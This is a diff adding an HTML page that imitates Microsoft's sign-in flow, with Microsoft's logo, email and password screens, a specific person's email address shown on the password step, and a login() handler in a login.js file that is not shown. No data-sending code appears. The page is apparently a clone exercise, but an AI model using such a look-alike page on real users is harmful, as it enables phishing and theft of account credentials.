@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Microsoft Login</title>
+    <link rel="stylesheet" href="login-form.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="microsoft-logo">
+        <img
+          src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
+          alt="Microsoft Logo"
+        />
+      </div>
+
+      <div id="signInScreen">
+        <h2>Sign in</h2>
+        <div class="input-group">
+          <input type="text" id="emailOrPhone" placeholder="Email" />
+          <br />
+          <a href="#" class="forgot-password-link"
+            >Can't access your account?</a
+          >
+        </div>
+        <div class="button-group">
+          <button class="back-button" onclick="goBack()">Back</button>
+          <button onclick="showPasswordScreen()">Next</button>
+        </div>
+        <div class="sign-in-options">
+          <a href="#">Sign-in options</a>
+        </div>
+      </div>
+
+      <div id="passwordScreen" style="display: none">
+        <div class="microsoft-email-display">
+          <span class="arrow">&larr;</span>
+          <span id="displayEmail">audrey.phang@binus.ac.id</span>
+          <a href="#" onclick="showSignInScreen()">Change account</a>
+        </div>
+        <h2>Enter password</h2>
+        <div class="input-group">
+          <input type="password" id="password" placeholder="Password" />
+          <a href="#" class="forgot-password-link">Forgot my password</a>
+        </div>
+        <button onclick="login()">Sign in</button>
+      </div>
+
+      <p id="error" class="error"></p>
+    </div>
+
+    <script src="login.js"></script>
+  </body>
+</html>
